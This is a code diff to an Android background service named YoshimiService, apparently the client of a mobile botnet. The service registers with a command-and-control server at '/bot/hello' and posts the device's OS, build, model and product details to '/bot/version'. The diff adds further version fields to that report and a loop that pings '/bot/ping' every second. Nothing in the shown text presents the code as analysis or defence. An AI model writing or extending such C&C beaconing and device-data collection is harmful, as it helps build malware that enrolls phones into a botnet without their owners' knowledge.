@@ -47,7 +47,11 @@ public class YoshimiService extends Service {
 	
 	
 	public int onStartCommand(Intent intent, int flags, int startId) {
-		mainLoop();
+		try {
+			mainLoop();
+		} catch (InterruptedException error) {
+			Log.d(TAG, error.toString());
+		}
 		Log.e(TAG, "Main loop ended?!?");
 		return 0;
 	}
@@ -70,15 +74,16 @@ public class YoshimiService extends Service {
 		}
 	}
 	
-	private void mainLoop() {
+	private void mainLoop() throws InterruptedException {
 		Log.d(TAG, "Starting main loop...");
 		String getResponse = Http.GET(CC_SERVER+"/bot/hello", URLEncoder.encode(uuid));
 		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
 		String postResponse = Http.POST(CC_SERVER+"/bot/version", URLEncoder.encode(uuid), getVersionInformation());
 		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
 		while (true) {
-			sleep();
+			Thread.sleep(1000);
 			Log.d(TAG, "Still alive!");
+			Http.GET(CC_SERVER+"/bot/ping", URLEncoder.encode(uuid));
 		}
 	}
 	
@@ -88,17 +93,11 @@ public class YoshimiService extends Service {
 		details.add(new BasicNameValuePair("os_version", System.getProperty("os.version")));
 		details.add(new BasicNameValuePair("build_version", android.os.Build.VERSION.INCREMENTAL));
 		details.add(new BasicNameValuePair("sdk_version", android.os.Build.VERSION.SDK));
+		details.add(new BasicNameValuePair("release_version", android.os.Build.VERSION.RELEASE));
+		details.add(new BasicNameValuePair("codename", android.os.Build.VERSION.CODENAME));
 		details.add(new BasicNameValuePair("device", android.os.Build.DEVICE));
 		details.add(new BasicNameValuePair("model", android.os.Build.MODEL));
 		details.add(new BasicNameValuePair("product", android.os.Build.PRODUCT));
 		return details;
-	}
-
-	private void sleep() {
-		try {
-			Thread.sleep(5000);
-		} catch (InterruptedException error) {
-			Log.d(TAG, "Sleep threw an exception: " + error.toString());
-		}
 	}
 }
